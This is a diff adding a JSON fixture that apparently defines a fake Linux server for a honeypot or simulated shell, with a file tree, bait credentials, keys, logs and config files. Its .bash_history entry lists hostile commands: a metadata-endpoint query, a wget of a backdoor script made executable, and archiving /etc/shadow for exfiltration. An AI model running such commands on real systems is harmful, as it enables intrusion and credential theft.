@@ -1,0 +1,410 @@
+{
+  "user": "user",
+  "hostname": "internal",
+  "current_dir": "/home/user",
+  "file_system": {
+    "/": [
+      "home",
+      "etc",
+      "var",
+      "usr",
+      "bin",
+      "sbin",
+      "tmp",
+      "opt",
+      "root",
+      "dev",
+      "proc",
+      "sys",
+      "boot",
+      "lib",
+      "media",
+      "mnt",
+      "srv",
+      "run"
+    ],
+    "/home": [
+      "user"
+    ],
+    "/home/user": [
+      "passwords.txt",
+      "financial_report_2024.pdf",
+      "admin_backup.sql",
+      "private_key.pem",
+      ".bash_history",
+      ".bashrc",
+      ".profile",
+      ".ssh",
+      "Documents",
+      "Downloads"
+    ],
+    "/home/user/.ssh": [
+      "authorized_keys",
+      "known_hosts",
+      "id_rsa",
+      "id_rsa.pub"
+    ],
+    "/home/user/Documents": [
+      "project_notes.txt",
+      "meeting_minutes.md",
+      "budget_2024.xlsx"
+    ],
+    "/home/user/Downloads": [
+      "setup.sh",
+      "exploit_kit.tar.gz"
+    ],
+    "/etc": [
+      "passwd",
+      "shadow",
+      "hosts",
+      "hostname",
+      "os-release",
+      "resolv.conf",
+      "fstab",
+      "crontab",
+      "ssh",
+      "network",
+      "apt",
+      "default",
+      "security",
+      "nginx",
+      "mysql"
+    ],
+    "/etc/ssh": [
+      "sshd_config",
+      "ssh_host_rsa_key.pub"
+    ],
+    "/etc/network": [
+      "interfaces"
+    ],
+    "/etc/apt": [
+      "sources.list"
+    ],
+    "/etc/default": [
+      "grub"
+    ],
+    "/etc/security": [
+      "limits.conf"
+    ],
+    "/etc/nginx": [
+      "nginx.conf",
+      "sites-available",
+      "sites-enabled"
+    ],
+    "/etc/nginx/sites-available": [
+      "default"
+    ],
+    "/etc/nginx/sites-enabled": [
+      "default"
+    ],
+    "/etc/mysql": [
+      "my.cnf"
+    ],
+    "/var": [
+      "log",
+      "www",
+      "lib",
+      "tmp",
+      "cache",
+      "spool",
+      "mail",
+      "run"
+    ],
+    "/var/log": [
+      "auth.log",
+      "syslog",
+      "kern.log",
+      "dpkg.log",
+      "nginx",
+      "mysql",
+      "apt",
+      "lastlog",
+      "wtmp",
+      "btmp",
+      "faillog"
+    ],
+    "/var/log/nginx": [
+      "access.log",
+      "error.log"
+    ],
+    "/var/log/mysql": [
+      "error.log"
+    ],
+    "/var/log/apt": [
+      "history.log"
+    ],
+    "/var/www": [
+      "html"
+    ],
+    "/var/www/html": [
+      "index.html",
+      "info.php",
+      "config.php",
+      ".htaccess"
+    ],
+    "/var/lib": [
+      "mysql",
+      "dpkg"
+    ],
+    "/var/lib/mysql": [
+      "ibdata1",
+      "ib_logfile0",
+      "mysql",
+      "performance_schema"
+    ],
+    "/var/lib/dpkg": [
+      "status"
+    ],
+    "/var/tmp": [],
+    "/var/cache": [
+      "apt"
+    ],
+    "/var/cache/apt": [
+      "archives"
+    ],
+    "/var/cache/apt/archives": [],
+    "/var/spool": [
+      "cron",
+      "mail"
+    ],
+    "/var/spool/cron": [
+      "crontabs"
+    ],
+    "/var/spool/cron/crontabs": [],
+    "/var/spool/mail": [],
+    "/var/mail": [],
+    "/var/run": [],
+    "/usr": [
+      "bin",
+      "sbin",
+      "lib",
+      "local",
+      "share",
+      "include"
+    ],
+    "/usr/bin": [
+      "python3",
+      "gcc",
+      "g++",
+      "make",
+      "git",
+      "curl",
+      "wget",
+      "ssh",
+      "scp",
+      "nmap",
+      "vim",
+      "nano",
+      "htop",
+      "tmux",
+      "zip",
+      "unzip",
+      "tar"
+    ],
+    "/usr/sbin": [
+      "nginx",
+      "mysqld",
+      "sshd",
+      "cron",
+      "useradd",
+      "userdel",
+      "iptables"
+    ],
+    "/usr/lib": [
+      "python3",
+      "x86_64-linux-gnu"
+    ],
+    "/usr/local": [
+      "bin",
+      "lib",
+      "share"
+    ],
+    "/usr/local/bin": [
+      "node",
+      "npm",
+      "pip3"
+    ],
+    "/usr/local/lib": [],
+    "/usr/local/share": [],
+    "/usr/share": [
+      "doc",
+      "man"
+    ],
+    "/usr/share/doc": [],
+    "/usr/share/man": [],
+    "/usr/include": [],
+    "/bin": [
+      "bash",
+      "sh",
+      "ls",
+      "cat",
+      "cp",
+      "mv",
+      "rm",
+      "mkdir",
+      "chmod",
+      "chown",
+      "grep",
+      "find",
+      "ps",
+      "kill",
+      "mount",
+      "umount",
+      "df",
+      "du",
+      "ping",
+      "netstat",
+      "ss",
+      "ip"
+    ],
+    "/sbin": [
+      "init",
+      "shutdown",
+      "reboot",
+      "fdisk",
+      "mkfs",
+      "iptables",
+      "ifconfig",
+      "route"
+    ],
+    "/tmp": [
+      "systemd-private-abc123"
+    ],
+    "/opt": [],
+    "/root": [],
+    "/dev": [
+      "null",
+      "zero",
+      "random",
+      "urandom",
+      "sda",
+      "sda1",
+      "sda2",
+      "tty0",
+      "tty1",
+      "pts"
+    ],
+    "/dev/pts": [],
+    "/proc": [
+      "1",
+      "cpuinfo",
+      "meminfo",
+      "version",
+      "uptime",
+      "loadavg",
+      "net",
+      "self"
+    ],
+    "/proc/net": [
+      "tcp",
+      "udp",
+      "arp"
+    ],
+    "/proc/self": [],
+    "/sys": [
+      "class",
+      "devices",
+      "kernel"
+    ],
+    "/sys/class": [
+      "net"
+    ],
+    "/sys/class/net": [
+      "eth0",
+      "lo"
+    ],
+    "/sys/devices": [],
+    "/sys/kernel": [],
+    "/boot": [
+      "vmlinuz-5.15.0-76-generic",
+      "initrd.img-5.15.0-76-generic",
+      "grub"
+    ],
+    "/boot/grub": [
+      "grub.cfg"
+    ],
+    "/lib": [
+      "x86_64-linux-gnu",
+      "modules",
+      "systemd"
+    ],
+    "/lib/x86_64-linux-gnu": [],
+    "/lib/modules": [
+      "5.15.0-76-generic"
+    ],
+    "/lib/modules/5.15.0-76-generic": [],
+    "/lib/systemd": [
+      "system"
+    ],
+    "/lib/systemd/system": [
+      "nginx.service",
+      "mysql.service",
+      "ssh.service",
+      "cron.service"
+    ],
+    "/media": [],
+    "/mnt": [],
+    "/srv": [
+      "www"
+    ],
+    "/srv/www": [],
+    "/run": [
+      "sshd.pid",
+      "nginx.pid"
+    ]
+  },
+  "file_contents": {
+    "passwords.txt": "admin:SuperSecretPass123!\ndb_user:password123\nroot:toor\nbackup_admin:B@ckup2024!\napi_service:sk-live-4f8a2b1c9e3d\nftp_user:Ftp_acc3ss!",
+    "financial_report_2024.pdf": "[PDF Binary Content]\n%PDF-1.7\nConfidential - Q4 2024 Financial Summary\nTotal Revenue: $2,847,392\nOperating Expenses: $1,923,104\nNet Profit: $924,288\nProjected Growth: 12.4% YoY\n[End of extractable text]",
+    "admin_backup.sql": "-- MySQL dump 10.13  Distrib 8.0.33, for Linux (x86_64)\n-- Server version: 8.0.33-0ubuntu0.22.04.2\n\nCREATE DATABASE IF NOT EXISTS `webapp_prod`;\nUSE `webapp_prod`;\n\nDROP TABLE IF EXISTS `users`;\nCREATE TABLE `users` (\n  `id` int NOT NULL AUTO_INCREMENT,\n  `username` varchar(50) NOT NULL,\n  `password_hash` varchar(255) NOT NULL,\n  `email` varchar(100) DEFAULT NULL,\n  `role` enum('admin','user','moderator') DEFAULT 'user',\n  `created_at` timestamp DEFAULT CURRENT_TIMESTAMP,\n  PRIMARY KEY (`id`)\n) ENGINE=InnoDB;\n\nINSERT INTO `users` VALUES\n(1,'admin','$2b$12$LJ3m4ys5ROXC0fVz0GByz.kBgT6FPH9gkNOqN4vSMzRqN0v9GxRFi','admin@internal.corp','admin','2024-01-15 08:30:00'),\n(2,'jdoe','$2b$12$wNZ3lCm4FJaBvGShDpz6guR0kJseVfMZl5qKz5V6bqLx8vFJcvVZy','john.doe@internal.corp','user','2024-02-20 14:22:00'),\n(3,'svc_backup','$2b$12$9pT7rVMgFqkmO5s8kBzWoeY5e0LCjwEe0L2NHdP5w9yG4mR3a6xb6','backup@internal.corp','admin','2024-03-01 09:00:00');",
+    "private_key.pem": "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA0Z3VS5JJcds3xfn/ygWyF8PbnGy0AHB7MhgHcTz6sE2I2yPB\naFDrBz7tCH3fcWpMkFwt4gHxMBIDgdSrVE3V0eFLFnXRAkHH7VwNrUh2L9YpMQXB\nfSeZiGnFq7GkNp0bYEBxMZ3GjaqrkMjJL2E8s0X6mTdhaiIFjYluCOYXnUPkOGBh\nT1VmjqgEMFKiJbMLmyjRPsKkaN9tz9VEFdMAeBwpFJBDrHMSVzVOzMBBamQjrPl1\n3LQ7CkObiKNLCfHSZmqJbZPMEnaDbGpHeBQPH5GJfJmG6BjUbNPunRsNnBe0YAMS\nATrKCReSHGlFnJkR2MgMxTC/zd0sCTe3plTlIwIDAQABAoIBAFgX4kVMYR0bEFnr\nvLFpjmfAkRKhJcqFnieFMr3yNqm1vKTcBUPGTCMarLfCYfUVrHLKjJmsGaKJhVQB\n-----END RSA PRIVATE KEY-----",
+    ".bash_history": "ls -la\ncat passwords.txt\nwhoami\nsudo su -\ncd /var/www/html\ncat config.php\nmysql -u root -p\nfind / -name '*.conf' 2>/dev/null\nnmap -sV 192.168.1.0/24\ncurl http://169.254.169.254/latest/meta-data/\nwget http://192.168.1.1/backdoor.sh\nchmod +x backdoor.sh\nhistory\nssh admin@10.0.0.5\ntar czf /tmp/exfil.tar.gz /etc/passwd /etc/shadow\nbase64 /tmp/exfil.tar.gz\nnetstat -tulnp\nps aux | grep root\ncat /proc/version\nuname -a",
+    ".bashrc": "# ~/.bashrc: executed by bash(1) for non-login shells.\n\n# If not running interactively, don't do anything\ncase $- in\n    *i*) ;;\n      *) return;;\nesac\n\nHISTCONTROL=ignoreboth\nHISTSIZE=1000\nHISTFILESIZE=2000\nshopt -s histappend\nshopt -s checkwinsize\n\nPS1='${debian_chroot:+($debian_chroot)}\\u@\\h:\\w\\$ '\n\nalias ll='ls -alF'\nalias la='ls -A'\nalias l='ls -CF'\nalias grep='grep --color=auto'\n\nexport PATH=$PATH:/usr/local/bin",
+    ".profile": "# ~/.profile: executed by the command interpreter for login shells.\n\nif [ -n \"$BASH_VERSION\" ]; then\n    if [ -f \"$HOME/.bashrc\" ]; then\n        . \"$HOME/.bashrc\"\n    fi\nfi\n\nPATH=\"$HOME/bin:$HOME/.local/bin:$PATH\"",
+    ".ssh/authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7nZ4U8H admin@workstation\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDk3VHV deploy@ci-server",
+    ".ssh/known_hosts": "192.168.1.1 ssh-rsa AAAAB3NzaC1yc2EAAAADAQ...\n10.0.0.5 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA...\ngithub.com ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQ...",
+    ".ssh/id_rsa": "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAYEA...\n-----END OPENSSH PRIVATE KEY-----",
+    ".ssh/id_rsa.pub": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7nZ4U8H user@internal",
+    "Documents/project_notes.txt": "# Internal Server Migration Notes\n\nPhase 1: Database migration (COMPLETED)\n  - Migrated MySQL 5.7 -> 8.0\n  - Backup stored at /var/lib/mysql_backup_20240115/\n\nPhase 2: Application deployment (IN PROGRESS)\n  - Docker containers on 10.0.0.10-15\n  - k8s cluster credentials in /opt/k8s/admin.conf\n\nPhase 3: Network segmentation (PENDING)\n  - VLAN config pending approval\n  - Firewall rules draft at /etc/iptables/rules.v4\n\nCredentials:\n  DB Root: mysql_r00t_2024!\n  Redis: redis_s3cure_key\n  API Gateway: X-Api-Key: sk-prod-a8f2c1b9e3d4",
+    "Documents/meeting_minutes.md": "# Team Meeting - Jan 20, 2026\n\n## Attendees\n- Sarah (Lead), Mike (DevOps), Anna (Security)\n\n## Discussion\n1. Server hardening postponed to Q2\n2. Vulnerability scan revealed 3 critical CVEs\n   - CVE-2024-21762 (FortiOS) - URGENT\n   - CVE-2024-1709 (ScreenConnect)\n   - CVE-2024-3400 (PAN-OS)\n3. Patch schedule: weekends only\n\n## Action Items\n- Mike: Update firewall rules by Friday\n- Anna: Run penetration test on staging\n- Sarah: Review access control lists",
+    "Documents/budget_2024.xlsx": "[Excel Binary - Budget Spreadsheet]\nIT Security Budget 2024\nTotal Allocated: $450,000\nSpent to Date: $287,500\nRemaining: $162,500",
+    "Downloads/setup.sh": "#!/bin/bash\n# Quick server setup script\napt update && apt upgrade -y\napt install -y nginx mysql-server python3-pip\nsystemctl enable nginx mysql\nufw allow 22/tcp\nufw allow 80/tcp\nufw allow 443/tcp\nufw enable\necho 'Setup complete'",
+    "Downloads/exploit_kit.tar.gz": "[Binary file - tar.gz archive, 2.3MB]",
+    "/etc/passwd": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsshd:x:100:65534::/run/sshd:/usr/sbin/nologin\nmysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false\nuser:x:1000:1000:user:/home/user:/bin/bash",
+    "/etc/shadow": "cat: /etc/shadow: Permission denied",
+    "/etc/hosts": "127.0.0.1\tlocalhost\n127.0.1.1\tinternal\n10.0.0.5\tdb-server\n10.0.0.10\tapp-server-01\n10.0.0.11\tapp-server-02\n::1\t\tlocalhost ip6-localhost ip6-loopback\nff02::1\t\tip6-allnodes\nff02::2\t\tip6-allrouters",
+    "/etc/hostname": "internal",
+    "/etc/os-release": "PRETTY_NAME=\"Ubuntu 22.04.2 LTS\"\nNAME=\"Ubuntu\"\nVERSION_ID=\"22.04\"\nVERSION=\"22.04.2 LTS (Jammy Jellyfish)\"\nID=ubuntu\nID_LIKE=debian\nHOME_URL=\"https://www.ubuntu.com/\"\nSUPPORT_URL=\"https://help.ubuntu.com/\"\nBUG_REPORT_URL=\"https://bugs.launchpad.net/ubuntu/\"",
+    "/etc/resolv.conf": "nameserver 8.8.8.8\nnameserver 8.8.4.4\nsearch internal.corp",
+    "/etc/fstab": "# /etc/fstab: static file system information.\n#\n# <file system>  <mount point>  <type>  <options>       <dump> <pass>\nUUID=a1b2c3d4    /              ext4    errors=remount-ro 0     1\nUUID=e5f6a7b8    /boot          ext2    defaults        0     2\nUUID=c9d0e1f2    none           swap    sw              0     0\n/dev/sda3        /var           ext4    defaults        0     2",
+    "/etc/crontab": "SHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n# m h dom mon dow user    command\n17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly\n25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )\n0  */6  * * *   root    /usr/local/bin/backup.sh >> /var/log/backup.log 2>&1\n*/5 *   * * *   www-data /var/www/html/cron_job.php",
+    "/etc/ssh/sshd_config": "# SSH Server Configuration\nPort 22\nListenAddress 0.0.0.0\nProtocol 2\nHostKey /etc/ssh/ssh_host_rsa_key\nPermitRootLogin yes\nPasswordAuthentication yes\nPubkeyAuthentication yes\nAuthorizedKeysFile .ssh/authorized_keys\nMaxAuthTries 6\nMaxSessions 10\nX11Forwarding yes\nUsePAM yes\nAcceptEnv LANG LC_*\nSubsystem sftp /usr/lib/openssh/sftp-server",
+    "/etc/ssh/ssh_host_rsa_key.pub": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDV8m... root@internal",
+    "/etc/network/interfaces": "# This file describes the network interfaces\nauto lo\niface lo inet loopback\n\nauto eth0\niface eth0 inet static\n    address 192.168.1.105\n    netmask 255.255.255.0\n    gateway 192.168.1.1\n    dns-nameservers 8.8.8.8 8.8.4.4",
+    "/etc/apt/sources.list": "deb http://archive.ubuntu.com/ubuntu jammy main restricted universe multiverse\ndeb http://archive.ubuntu.com/ubuntu jammy-updates main restricted universe multiverse\ndeb http://security.ubuntu.com/ubuntu jammy-security main restricted universe multiverse",
+    "/etc/default/grub": "GRUB_DEFAULT=0\nGRUB_TIMEOUT_STYLE=hidden\nGRUB_TIMEOUT=0\nGRUB_DISTRIBUTOR=`lsb_release -i -s 2> /dev/null || echo Debian`\nGRUB_CMDLINE_LINUX_DEFAULT=\"quiet splash\"\nGRUB_CMDLINE_LINUX=\"\"",
+    "/etc/security/limits.conf": "# /etc/security/limits.conf\n#<domain>  <type>  <item>  <value>\n*          soft    nofile  65535\n*          hard    nofile  65535\nwww-data   soft    nproc   4096\nwww-data   hard    nproc   8192\nmysql      soft    nofile  65535\nmysql      hard    nofile  65535",
+    "/etc/nginx/nginx.conf": "user www-data;\nworker_processes auto;\npid /run/nginx.pid;\n\nevents {\n    worker_connections 768;\n}\n\nhttp {\n    sendfile on;\n    tcp_nopush on;\n    types_hash_max_size 2048;\n    server_names_hash_bucket_size 64;\n    include /etc/nginx/mime.types;\n    default_type application/octet-stream;\n    ssl_protocols TLSv1.2 TLSv1.3;\n    access_log /var/log/nginx/access.log;\n    error_log /var/log/nginx/error.log;\n    gzip on;\n    include /etc/nginx/sites-enabled/*;\n}",
+    "/etc/nginx/sites-available/default": "server {\n    listen 80 default_server;\n    listen [::]:80 default_server;\n    root /var/www/html;\n    index index.html index.php;\n    server_name internal.corp;\n    location / {\n        try_files $uri $uri/ =404;\n    }\n    location ~ \\.php$ {\n        include snippets/fastcgi-php.conf;\n        fastcgi_pass unix:/run/php/php8.1-fpm.sock;\n    }\n}",
+    "/etc/mysql/my.cnf": "[mysqld]\nuser            = mysql\npid-file        = /var/run/mysqld/mysqld.pid\nsocket          = /var/run/mysqld/mysqld.sock\nport            = 3306\ndatadir         = /var/lib/mysql\nbind-address    = 0.0.0.0\nmax_connections = 150\nlog_error       = /var/log/mysql/error.log\nslow_query_log  = 1\nslow_query_log_file = /var/log/mysql/slow.log\nlong_query_time = 2",
+    "/var/log/auth.log": "Feb 19 14:23:07 internal sshd[1234]: Accepted password for user from 192.168.1.5 port 49312 ssh2\nFeb 19 14:23:07 internal sshd[1234]: pam_unix(sshd:session): session opened for user user(uid=1000)\nFeb 19 14:25:33 internal sshd[1456]: Failed password for root from 10.13.37.2 port 52100 ssh2\nFeb 19 14:25:35 internal sshd[1456]: Failed password for root from 10.13.37.2 port 52100 ssh2\nFeb 19 14:25:38 internal sshd[1456]: Failed password for root from 10.13.37.2 port 52100 ssh2\nFeb 19 14:25:38 internal sshd[1456]: Connection closed by 10.13.37.2 port 52100 [preauth]\nFeb 19 14:30:12 internal sudo:     user : TTY=pts/0 ; PWD=/home/user ; USER=root ; COMMAND=/bin/cat /etc/shadow\nFeb 19 14:30:12 internal sudo: pam_unix(sudo:session): session opened for user root(uid=0)\nFeb 19 15:01:45 internal sshd[1789]: Invalid user admin from 203.0.113.42 port 38291\nFeb 19 15:01:45 internal sshd[1789]: Connection closed by invalid user admin 203.0.113.42 port 38291",
+    "/var/log/syslog": "Feb 19 14:00:01 internal CRON[1100]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)\nFeb 19 14:20:00 internal systemd[1]: Started Session 47 of User user.\nFeb 19 14:23:07 internal systemd[1]: Started OpenSSH Per-Connection Daemon (192.168.1.5).\nFeb 19 14:45:00 internal /USR/SBIN/CRON[1567]: (www-data) CMD (/var/www/html/cron_job.php)\nFeb 19 15:00:01 internal CRON[1678]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)\nFeb 19 15:15:22 internal kernel: [42356.234] eth0: link up, 1000Mbps full-duplex\nFeb 19 15:30:00 internal nginx[890]: 192.168.1.50 - - \"GET / HTTP/1.1\" 200 612",
+    "/var/log/kern.log": "Feb 19 14:00:00 internal kernel: [    0.000000] Linux version 5.15.0-76-generic (buildd@lcy02-amd64-080)\nFeb 19 14:00:00 internal kernel: [    0.000000] Command line: BOOT_IMAGE=/boot/vmlinuz-5.15.0-76-generic root=UUID=a1b2c3d4\nFeb 19 14:00:00 internal kernel: [    0.523456] Memory: 4048376K/4194304K available (16384K kernel code)\nFeb 19 14:00:01 internal kernel: [    1.234567] ACPI: _SB_.PCI0.SATA - Initialized\nFeb 19 14:00:01 internal kernel: [    1.567890] EXT4-fs (sda1): mounted filesystem with ordered data mode",
+    "/var/log/dpkg.log": "2024-12-15 09:30:02 install nginx 1.22.0-1ubuntu1 <none>\n2024-12-15 09:30:45 install mysql-server 8.0.33-0ubuntu0.22.04.2 <none>\n2025-01-10 14:22:11 upgrade openssh-server 1:8.9p1-3ubuntu0.4 1:8.9p1-3ubuntu0.6\n2025-01-20 10:05:33 install python3-pip 22.0.2+dfsg-1ubuntu0.4 <none>\n2026-02-01 08:15:00 upgrade linux-image-5.15.0-76-generic 5.15.0-76.83 5.15.0-76.84",
+    "/var/log/nginx/access.log": "192.168.1.50 - - [19/Feb/2026:14:30:00 +0000] \"GET / HTTP/1.1\" 200 612 \"-\" \"Mozilla/5.0\"\n192.168.1.50 - - [19/Feb/2026:14:30:01 +0000] \"GET /favicon.ico HTTP/1.1\" 404 196 \"-\" \"Mozilla/5.0\"\n10.13.37.2 - - [19/Feb/2026:14:35:22 +0000] \"GET /admin HTTP/1.1\" 403 162 \"-\" \"curl/7.81.0\"\n10.13.37.2 - - [19/Feb/2026:14:35:25 +0000] \"POST /wp-login.php HTTP/1.1\" 404 196 \"-\" \"Python-urllib/3.10\"\n203.0.113.42 - - [19/Feb/2026:15:00:00 +0000] \"GET /.env HTTP/1.1\" 404 196 \"-\" \"Go-http-client/1.1\"\n203.0.113.42 - - [19/Feb/2026:15:00:02 +0000] \"GET /config.php HTTP/1.1\" 200 0 \"-\" \"Go-http-client/1.1\"",
+    "/var/log/nginx/error.log": "2026/02/19 14:35:22 [error] 891#891: *234 access forbidden by rule, client: 10.13.37.2, request: \"GET /admin HTTP/1.1\"\n2026/02/19 14:35:25 [error] 891#891: *235 open() \"/var/www/html/wp-login.php\" failed (2: No such file), client: 10.13.37.2",
+    "/var/log/mysql/error.log": "2026-02-19T14:00:00.000000Z 0 [System] [MY-010116] [Server] /usr/sbin/mysqld (mysqld 8.0.33) starting as process 567\n2026-02-19T14:00:01.000000Z 0 [System] [MY-010931] [Server] /usr/sbin/mysqld: ready for connections. port: 3306\n2026-02-19T14:30:15.000000Z 3 [Warning] [MY-013360] [Server] Plugin mysql_native_password reported: authentication attempt from 10.13.37.2",
+    "/var/log/apt/history.log": "Start-Date: 2025-01-10 14:22:00\nCommandline: apt upgrade -y\nUpgrade: openssh-server:amd64 (1:8.9p1-3ubuntu0.4, 1:8.9p1-3ubuntu0.6)\nEnd-Date: 2025-01-10 14:22:15\n\nStart-Date: 2026-02-01 08:15:00\nCommandline: apt upgrade -y\nUpgrade: linux-image-5.15.0-76-generic:amd64 (5.15.0-76.83, 5.15.0-76.84)\nEnd-Date: 2026-02-01 08:15:45",
+    "/var/www/html/index.html": "<!DOCTYPE html>\n<html>\n<head><title>Welcome to Internal Server</title></head>\n<body>\n<h1>Internal Corporate Portal</h1>\n<p>Authorized access only. All activity is monitored and logged.</p>\n<p>Contact IT: admin@internal.corp</p>\n</body>\n</html>",
+    "/var/www/html/info.php": "<?php\n// Server info page - REMOVE IN PRODUCTION\nphpinfo();\n?>",
+    "/var/www/html/config.php": "<?php\n// Database configuration - DO NOT EXPOSE\ndefine('DB_HOST', '10.0.0.5');\ndefine('DB_USER', 'webapp');\ndefine('DB_PASS', 'W3bapp_Pr0d_2024!');\ndefine('DB_NAME', 'webapp_prod');\ndefine('API_KEY', 'sk-live-4f8a2b1c9e3d7a6b5f4e2d1c');\ndefine('JWT_SECRET', 'h8Kp2mNq5RtVwXyZ');\n?>",
+    "/var/www/html/.htaccess": "RewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.html$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.html [L]\n\n# Block access to sensitive files\n<FilesMatch \"\\.(env|config|sql|bak)$\">\n    Order allow,deny\n    Deny from all\n</FilesMatch>",
+    "/proc/cpuinfo": "processor\t: 0\nvendor_id\t: GenuineIntel\ncpu family\t: 6\nmodel\t\t: 142\nmodel name\t: Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz\nstepping\t: 10\nmicrocode\t: 0xf0\ncpu MHz\t\t: 1800.000\ncache size\t: 6144 KB\nphysical id\t: 0\nsiblings\t: 4\ncpu cores\t: 4\nflags\t\t: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 sse sse2 ht tm pbe syscall nx rdtscp lm constant_tsc",
+    "/proc/meminfo": "MemTotal:        4048376 kB\nMemFree:          512840 kB\nMemAvailable:    1845632 kB\nBuffers:          234560 kB\nCached:          1098232 kB\nSwapTotal:       2097148 kB\nSwapFree:        2097148 kB\nActive:          2156780 kB\nInactive:         987456 kB",
+    "/proc/version": "Linux version 5.15.0-76-generic (buildd@lcy02-amd64-080) (gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #83-Ubuntu SMP Thu Jun 15 19:32:05 UTC 2023",
+    "/proc/uptime": "152345.67 589012.34",
+    "/proc/loadavg": "0.15 0.22 0.18 1/234 1892",
+    "/boot/grub/grub.cfg": "# GRUB Configuration (auto-generated)\nmenuentry 'Ubuntu' {\n    set root='hd0,msdos1'\n    linux /boot/vmlinuz-5.15.0-76-generic root=UUID=a1b2c3d4 ro quiet splash\n    initrd /boot/initrd.img-5.15.0-76-generic\n}"
+  },
+  "last_updated": null
+}
